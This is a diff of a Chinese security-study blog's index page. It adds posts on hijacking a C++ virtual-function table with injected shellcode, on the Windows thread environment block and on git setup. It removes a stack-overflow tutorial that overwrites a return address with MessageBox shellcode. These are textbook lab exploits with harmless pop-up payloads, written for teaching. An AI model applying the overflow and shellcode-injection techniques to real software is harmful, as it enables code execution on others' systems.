@@ -333,6 +333,584 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/01/攻击C-的虚函数/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/07/01/攻击C-的虚函数/" itemprop="url">攻击C++的虚函数</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-07-01T18:23:16+08:00">
+                2017-07-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="C-简介"><a href="#C-简介" class="headerlink" title="C++简介"></a>C++简介</h3><p><b>理解虚函数和虚表</b></p>
+<ol>
+<li>C++类的成员函数声明时，若使用关键字virtual进行修饰，则被称为虚函数</li>
+<li>一个类中可能有多个虚函数</li>
+<li>虚函数的入口地址统一保存在虚表(Vtable)之中</li>
+<li><p>对象在使用虚函数时，首先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用</p>
+</li>
+<li><font color="#f00">虚表指针保存在对象的内存空间中，紧接着虚表指针的是其他成员变量</font>
+</li>
+<li><p>虚函数只有通过对象指针的引用才能显示其动态调用的特性。</p>
+</li>
+</ol>
+<h3 id="C-虚函数的利用"><a href="#C-虚函数的利用" class="headerlink" title="C++虚函数的利用"></a>C++虚函数的利用</h3><p>实验代码：</p>
+<pre><code>
+#include "windows.h"
+#include "iostream.h"
+
+char shellcode[] =
+    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
+    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
+    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
+    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
+    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
+    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
+    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
+    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
+    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
+    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
+    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"
+    "\x50\xAE\x42\x00";        // set fake virtual function pointer
+
+class Failwest
+{
+public:
+    char buf[200];
+    virtual void test(void)
+    {
+        cout&lt;&lt;"Class Vtable::test()"&lt;&lt;endl;
+    };
+};
+
+Failwest overflow, *p;
+
+void main(void)
+{
+    char *p_vtable;
+    p_vtable = overflow.buf - 4;        //point to virtual table
+    // reset fake virtual table to 0x004088cc
+    // the address mat need to ajusted via runtime debug
+    __asm int 3;
+    p_vtable[0] = 0x00;
+    p_vtable[1] = 0xAF;
+    p_vtable[2] = 0x42;
+    p_vtable[3] = 0x00;
+    strcpy(overflow.buf, shellcode);    // set fake virtual function pointer
+    p = &overflow;
+    p->test();
+}
+</code></pre>
+
+<p>C++虚函数利用原理图：<br><img src="/images/2017-07-01/vtable.jpg" alt="C++虚函数利用原理图"></p>
+<p>首先需要知道的是：</p>
+<ul>
+<li>idata: 明显是一个Imports函数的代码段，这里集中所有外部函数地址，代码中会先跳到该地址后再执行，PE文件加载器在开始会获取真实的函数地址来修补idata段中的函数地址。</li>
+<li>data: 这个段存放程序的全局数据、全局常量等。</li>
+<li>rdata: 名字上看就是资源数据段，程序用到什么资源数据都在这里，资源包括你自己封包的，也包括开发工具自动封包的。</li>
+</ul>
+<p>所以我们应该在data段中找到自己需要的实验的全局变量</p>
+<font color="#f00">局部变量在栈中</font>
+
+
+<p>得到shellcode起始地址：0x0042AE50<br>shellcode结束地址：0x0042AF00</p>
+<h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><p><img src="/images/2017-07-01/result1.jpg" alt="实验结果"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/30/TEB简介/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/06/30/TEB简介/" itemprop="url">TEB简介</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-30T21:16:57+08:00">
+                2017-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全技术/" itemprop="url" rel="index">
+                    <span itemprop="name">安全技术</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="TEB特点"><a href="#TEB特点" class="headerlink" title="TEB特点"></a>TEB特点</h3><ol>
+<li>一个进程可能同时有多个线程</li>
+<li>每个线程都有一个线程环境块TEB</li>
+<li>第一个TEB开始于0x7FFDE000</li>
+<li>之后新建的线程的TEB将紧随前边的TEB，之间相隔0x100字节，并向内存地址方向</li>
+<li>线程退出时，对应的TEB也被销毁，腾出的TEB空间被新建的线程重复使用。</li>
+</ol>
+<p>线程环境块的预测图：<br><img src="/images/2017-06-30/TEB_prediction.jpg" alt="线程环境块的预测图"></p>
+<h3 id="TEB结构"><a href="#TEB结构" class="headerlink" title="TEB结构"></a>TEB结构</h3><p>由于TEB才是初学，对里面的很多结构都不怎么了解，写这一节主要是为了贴一张图，方便以后补充！</p>
+<p><img src="/images/2017-06-30/TEB.jpg" alt="TEB"></p>
+<p>当然为了充实被本篇博客，笔者提供几个小程序：</p>
+<p><br></p>
+<font color="#0f0">从FS寄存器获取当前线程</font>
+
+<pre><code>
+int GetThreadId()
+{
+    int ithread = 0;
+    _asm{
+        xor esi , esi
+        mov eax, fs:[esi+18h]     
+        mov ecx, [eax+ 20h] 
+        mov eax, [eax+ 24h]
+        mov dword ptr[ithread], eax
+    }
+    return ithread;
+}
+
+</code></pre>
+
+<p><br></p>
+<font color="#0f0">从FS寄存器获取当前进程ID</font>
+
+<pre><code>
+int GetProcessId()
+{
+    int iProcess = 0;
+    _asm{
+        xor esi , esi
+        mov eax, fs:[esi+18h]
+        mov ecx, [eax+ 20h]
+        mov eax, [eax+ 24h]
+        mov dword ptr[iProcess ], ecx
+    }
+    return iProcess;
+}
+
+</code></pre>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/30/使用git在github上创建新工程/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="上善若水">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/06/30/使用git在github上创建新工程/" itemprop="url">使用git在github上创建新工程</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-30T14:29:17+08:00">
+                2017-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/tool/" itemprop="url" rel="index">
+                    <span itemprop="name">tool</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>这段时间进经常会忘记如何在github上同步工程，于是又得查资料，查参考书，浪费了很长时间，因此有了感触，写几篇有关此类问题的篇章！</p>
+<font color="#f00">这是老手新手都十分容易犯的错误，就是在创建一个新github项目或者以本地已有项目为原型重新创建一个github项目时，容易创建一个空文件夹就直接关联远程仓库，这样做只会返回错误！！！所以，文件夹一定不能为空......</font>
+
+<h3 id="创建新工程需要的命令"><a href="#创建新工程需要的命令" class="headerlink" title="创建新工程需要的命令"></a>创建新工程需要的命令</h3><h4 id="完成本地项目与git的关联"><a href="#完成本地项目与git的关联" class="headerlink" title="完成本地项目与git的关联"></a>完成本地项目与git的关联</h4><pre><code>
+cd 工程目录
+git init    //初始化本地仓库，当前目录下会出现一个名为 .git 的目录
+git add .    //将所有文件添加到缓存区，告诉 Git 开始对这些文件进行跟踪
+git commit -am "Hello"    //提交文件到本地仓库
+
+</code></pre>
+
+<h4 id="完成远程项目的创建"><a href="#完成远程项目的创建" class="headerlink" title="完成远程项目的创建"></a>完成远程项目的创建</h4><p>在github上创建某个项目，然后可以拷贝处该项目的地址</p>
+<h4 id="关联远程仓库（github上创建的地址）"><a href="#关联远程仓库（github上创建的地址）" class="headerlink" title="关联远程仓库（github上创建的地址）"></a>关联远程仓库（github上创建的地址）</h4><pre><code>
+git remote add origin https://github.com/Introspelliam/Hello.git    //关联远程仓库
+
+</code></pre>
+
+<h4 id="push本地项目到远程仓库"><a href="#push本地项目到远程仓库" class="headerlink" title="push本地项目到远程仓库"></a>push本地项目到远程仓库</h4><pre><code>
+git push origin master     //push项目到master
+Username for 'https://github.com': //你的github账户名称
+
+</code></pre>
+
+
+<h3 id="github上提供的工程创建方法"><a href="#github上提供的工程创建方法" class="headerlink" title="github上提供的工程创建方法"></a>github上提供的工程创建方法</h3><p><b>…or create a new repository on the command line</b></p>
+<pre><code>echo &quot;# ctf-challenges&quot; &gt;&gt; README.md
+git init
+git add README.md
+git commit -m &quot;first commit&quot;
+git remote add origin https://github.com/Introspelliam/ctf-challenges.git
+git push -u origin master
+</code></pre><p><b>…or push an existing repository from the command line</b></p>
+<pre><code>git remote add origin https://github.com/Introspelliam/ctf-challenges.git
+git push -u origin master
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/29/windows-异常处理中的漏洞利用/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2541,765 +3119,11 @@ void main()
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/22/栈溢出原理与实践/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/22/栈溢出原理与实践/" itemprop="url">栈溢出原理与实践</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T22:13:43+08:00">
-                2017-06-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><b>声明：本章的所有实验都是在Windows 2000 Server上完成的。生成字符串并查找其偏移是在kali 2.0上，查找跳转函数的VA是在windows 10上用IDA。</b></p>
-<h3 id="1-栈溢出原理"><a href="#1-栈溢出原理" class="headerlink" title="1. 栈溢出原理"></a>1. 栈溢出原理</h3><h4 id="1-1-修改邻接变量的原理"><a href="#1-1-修改邻接变量的原理" class="headerlink" title="1.1 修改邻接变量的原理"></a>1.1 修改邻接变量的原理</h4><p>用实例来反映原理</p>
-<pre><code>
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-
-#define PASSWORD "1234567"
-
-int verify_password(char *password)
-{
-    int authenticated;
-    char buffer[8];
-    authenticated = strcmp(password, PASSWORD);
-    strcpy(buffer, password);
-    return authenticated;
-}
-
-void main()
-{
-    int valid_flag = 0;
-    char password[1024];
-    while(1)
-    {
-        printf("please input password:        ");
-        scanf("%s", password);
-        valid_flag = verify_password(password);
-        if (valid_flag)
-        {
-            printf("incorrect password!\n\n");
-        }
-        else
-        {
-            printf("Congratulations! You have passed the verification!\n");
-            break;
-        }
-    }
-}
-
-</code></pre>
-
-<p>于是栈帧布局为：<br><img src="/images/2017-06-22/stack_layout.png" alt="栈帧布局"></p>
-<p>因此，当你输入7位正确密码（&quot;1234567&quot;）或者输入8字节其他字符串（比原始字符串要大），都能通过验证。authenticated是int类型，在内存中是DWORD，占4个字节。所以当输入8位后，数组越界，buffer[8]、buffer[9]、buffer[10]、buffer[11]将写入相邻的变量authenticated中。</p>
-<font color="#f00">win32系统中数据是由低位向高位存储一个4字节的双字（DWORD），但作为数值应用时，却是按照由高位字节向低位字节进行解释。</font>
-
-<p>如果输入的是1234567，那么结果为：<br>34 33 32 31<br>00 37 36 35<br>一定要注意window字节顺序</p>
-<h4 id="1-2-修改函数返回地址"><a href="#1-2-修改函数返回地址" class="headerlink" title="1.2 修改函数返回地址"></a>1.2 修改函数返回地址</h4><p>通过覆盖返回地址，我们可以跳转到我们想到达的位置</p>
-<p><b>问题1：如何修改返回地址，并准确的判定返回地址所在位置？</b></p>
-<font color="#0f0">在函数返回的&quot;retn&quot;指令执行时，栈顶元素恰好是这个返回地址。“retn”指令会把这个地址弹入EIP寄存器中，之后跳转到这个地址去执行。栈顶是OllyDbg右侧ESP标灰的那个</font>
-
-<p>所以常见的解决办法是：<br>（1）输入一个较长的字符串，最好这个字符串有一定规律【这里可以使用/usr/share/metasploit-framework/tools/exploit/pattern_create.rb来创建一定长度的指令】，然后查看返回地址所指向的位置，看看是刚才所指定的字符串的哪个位置【这里可以使用/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 来查看字符串出现的地址】<br>（2）本机实验时，offset位置为16（此处的16指的是起始位置），因此如果想要对该程序的返回地址进行修改的话，就应该是<br>               <font color="#f00">&#39;a&#39;*16+返回地址</font><font color="#0f0">（返回地址得逆序编写）</font></p>
-<p><b>问题2：如何控制程序执行流程？</b></p>
-<p>上面已经讲了如何修改返回地址，所以如果在进入某个子函数之后，有栈溢出，就可以修改相应的返回地址，让其能够跳转至想让其执行代码的位置，这样就能控制流程；</p>
-<p>另外一种十分简单的办法就是直接修改PE文件，修改分支指令，这样也可以控制程序执行流程！</p>
-<h3 id="2-代码植入"><a href="#2-代码植入" class="headerlink" title="2. 代码植入"></a>2. 代码植入</h3><h4 id="2-1-测试代码"><a href="#2-1-测试代码" class="headerlink" title="2.1 测试代码"></a>2.1 测试代码</h4><pre><code>
-#include &lt;stdio.h&gt;
-#include &lt;string.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;windows.h&gt;
-
-#define PASSWORD "1234567"
-
-int verify_password(char *password)
-{
-    int authenticated;
-    char buffer[44];        //add local buff to be overflowed
-    authenticated = strcmp(password, PASSWORD);
-    strcpy(buffer, password);    //overflowed here!
-    return authenticated;
-}
-
-void main()
-{
-    int valid_flag = 0;
-    char password[1024];
-    FILE *fp;
-    LoadLibrary("user32.dll");    //prepare for messagebox
-    if (!(fp=fopen("password.txt","rw+")))
-    {
-        exit(0);
-    }
-    //MessageBoxA(0,"123","123",0);
-    fscanf(fp, "%s", password);
-    valid_flag = verify_password(password);
-    if(valid_flag)
-    {
-        printf("incorrect password!\n\n");
-    }
-    else
-    {
-        printf("Congratulations! You have passed the verification!\n\n");
-    }
-    fclose(fp);
-}
-</code></pre>
-
-<font color="#dd0">其中头文件windows.h，是方便程序能够顺利调用LoadLibrary函数去装载user32.dll<br>verify_password函数的局部变量buffer由8个字节增加到44字节，这样做是为了有足够的空间来“承载”我们植入的代码。<br>main函数中增加了LoadLibrary(&quot;user32.dll&quot;)用于初始化装载user32.dll，以便在植入代码中调用MessageBox。<br></font>
-
-<p><b>需要完成的工作：</b></p>
-<ol>
-<li>分析并调试漏洞程序，获得淹没返回地址的偏移</li>
-<li>获得buffer的起始地址，并将其写入password.txt的相应偏移，用来冲刷返回地址</li>
-<li>向password.txt中写入可执行的机器代码，用来调用API弹出一个消息框。</li>
-</ol>
-<font color="#f00">通过调试可以获得buffer数组的起始地址0x0012FAF0，以及password.txt文件中第53~56个字符的ASCII码值将写入栈帧中的返回地址，成为函数返回后执行的指令地址</font>
-
-<p>MSDN对该函数的解释如下：</p>
-<pre><code>
-int WINAPI MessageBox(
-  _In_opt_ HWND    hWnd,        //handle to owner window
-  _In_opt_ LPCTSTR lpText,        //text in message box
-  _In_opt_ LPCTSTR lpCaption,    //messagebox title
-  _In_     UINT    uType        //Messagebox style
-);
-</code></pre>
-
-<ul>
-<li>hWnd[in] 消息框所属窗口的句柄，如果为NULL，消息框则不属于任何窗口</li>
-<li>IpText[in]  字符串指针，所指字符串会在消息框中显示</li>
-<li>IpCaption[in]  字符串指针，所指字符串将成为消息框的标题</li>
-<li>uType[in]  消息框的风格（单按钮、多按钮等），NULL代表默认风格</li>
-</ul>
-<p>熟悉MFC的程序员都知道，系统其实并不存在真正的MessageBox函数，对MessageBox这类API的调用最终都将由系统按照参数中字符串的类型选择“A”类函数（ASCII）或者“W”类型函数（UNICODE）调用。因此，本文中用的是MessageBoxA。</p>
-<p><b>用汇编语言调用MessageBoxA需要三个步骤</b></p>
-<ol>
-<li>装载动态链接库user32.dll。MessageBoxA是动态链接库user32.dll的导出函数。虽然大多数有图形界面的程序都已经装载了该库，但是本实验的Console程序并没有默认加载。</li>
-<li>在汇编语言中调用该函数需要获得这个函数的入口地址</li>
-<li>在调用前需要向栈中从右向左的顺序压入MessageBoxA的4个参数</li>
-</ol>
-<font color="#f00">获取MessageBoxA的方式，我们在《查找动态链接库的API地址》那一篇博文中有讲，这里仅仅给出Windows 2000 Server的MessageBoxA地址为0x77E16544.</font>
-
-<p>下面将让弹出的窗口显示标题和文本内容都为“failwest”，而压入的第一个和第四个参数都为NULL。</p>
-<p><b><center>机器代码(具体操作可以参见《机器代码与汇编代码的转换》)</center></b></p>
-<table>
-<thead>
-<tr>
-<th>机器代码（十六进制）</th>
-<th>汇编指令</th>
-<th>注释</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>33DB</td>
-<td>XOR EBX, EBX</td>
-</tr>
-<tr>
-<td>53</td>
-<td>PUSH EBX</td>
-</tr>
-<tr>
-<td>6877657374</td>
-<td>PUSH 74736577</td>
-</tr>
-<tr>
-<td>6877657374</td>
-<td>PUSH 74736577</td>
-<td>压入NULL结尾的&quot;failwest&quot;字符串。之所以使用EBX清零后作为字符串的截断符，是为了避免&quot;PUSH 0&quot;中的NULL，否则植入的机器码会被strcpy函数截断</td>
-</tr>
-<tr>
-<td>8BC4</td>
-<td>MOV EAX, ESP</td>
-<td>EAX里是字符串指针</td>
-</tr>
-<tr>
-<td>53</td>
-<td>PUSH EBX</td>
-</tr>
-<tr>
-<td>50</td>
-<td>PUSH EAX</td>
-</tr>
-<tr>
-<td>50</td>
-<td>PUSH EAX</td>
-</tr>
-<tr>
-<td>53</td>
-<td>PUSH EBX</td>
-<td>4个参数按照从右向左的顺序入栈，分别是(0,failwest,failwest,0)<br></td>
-</tr>
-</tbody>
-</table>
-<p>消息框是默认风格，文本区和标题都是&quot;failwest&quot;|<br>|B84465E177|MOV EAX, 0x77E16544|<br>|FFD0|CALL EAX|调用函数MessageBoxA。这里的地址依据机器而定|</p>
-<p>然后在这些代码与53—56处的buffer中0x0012FAF0(返回地址)，其余的字节用0x90(nop指令)填充。</p>
-<p>shellcode[] = &quot;\x33\xdb\x53\x68\x77\x65\x73\x74\x68\x77\x65\x73\x74<br>\x8b\xc4\x53\x50\x50\x53\xb8\x44\x65\xe1\x77\xff\xd0\x90<br>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90<br>\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xf0\xfa\x12\x00&quot;</p>
-<p><img src="/images/2017-06-22/failwest_test.jpg" alt="测试结果"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/22/栈的介绍/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/06/22/栈的介绍/" itemprop="url">栈的介绍</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-22T21:18:22+08:00">
-                2017-06-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/安全技术/" itemprop="url" rel="index">
-                    <span itemprop="name">安全技术</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1、内存的不同用途"><a href="#1、内存的不同用途" class="headerlink" title="1、内存的不同用途"></a>1、内存的不同用途</h3><p>进程使用的内存按照功能分为以下4个部分：<br>（1）代码区：这个区域存储着被装入执行的二进制机器代码，处理器会到这个区域取出指令并执行。<br>（2）数据区：用于存储全局变量<br>（3）堆区：进程可以在堆区动态地请求一定大小的内存，并在用完之后归还给堆区。动态分配和回收是堆区的特点。<br>（4）栈区：用于动态地存储函数之间的调用关系，以保证被调用函数在返回时恢复到母函数中继续执行。</p>
-<p> 协作过程如图所示：<br><img src="/images/2017-06-22/stack_cooperate.png" alt="协作过程图"></p>
-<p>内存中的栈区其实就是系统栈。系统栈由系统来维护。</p>
-<h3 id="2、函数调用过程"><a href="#2、函数调用过程" class="headerlink" title="2、函数调用过程"></a>2、函数调用过程</h3><pre><code>int func_B(int arg_B1, int arg_B2)
-{
-     int var_B1, var_B2;
-     var_B1 = arg_B1 + arg_B2;
-     var_B2 = arg_B1 - arg_B2;
-     return var_B1 * var_B2;
-}
-
-int func_A(int arg_A1, int arg_A2)
-{
-     int var_A;
-     var_A = func_B(arg_A1, arg_A2) + arg_A1;
-     return var_A;
-}
-
-int main(int argc, char **argv, char **envp)
-{
-     int var_main;
-     var_main = func_A(4,3);
-     return var_main;
-}
-</code></pre><p>同一文件的不同函数的代码在内存代码区中的分布可能是相邻也可能相距很远。代码的调用也如下图所示。<br><img src="/images/2017-06-22/code_addr.jpg" alt="代码指令所在位置和CPU在代码区中的取指轨迹"></p>
-<p>代码区精确的跳转是在与系统栈巧妙地配合过程中完成的。当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，并把它压入栈中。这个栈帧中的内存空间被它所属的函数独占，正常情况下是不会和别的函数共享的。当函数返回时，系统栈会弹出该函数所对应的栈帧。<br><img src="/images/2017-06-22/stack_call.jpg" alt="系统栈在函数调用中的变化"></p>
-<p>调用时的步骤：<br>（1）母函数调用子函数时，首先现在母函数所在栈帧里压入函数返回地址（一般为调用函数下面一条指令），然后为子函数创建新栈帧并压入系统栈（一般的步骤为push ebp[保存旧栈帧底部]  -&gt;  mov ebp, esp[将现在的栈顶换做栈帧底部]  -&gt; sub esp, xxx[抬高栈顶，为新栈帧开辟空间]）。<br>（2）子函数返回时，子函数的栈帧被弹出系统栈，母函数栈帧中的返回地址出现在栈顶，此时处理器按照这个返回地址重新跳到母函数代码区中执行。</p>
-<h3 id="3、寄存器与函数栈帧"><a href="#3、寄存器与函数栈帧" class="headerlink" title="3、寄存器与函数栈帧"></a>3、寄存器与函数栈帧</h3><p>（1）ESP：栈指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。<br>（2）EBP：基址指针寄存器（extended stack pointer），其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。</p>
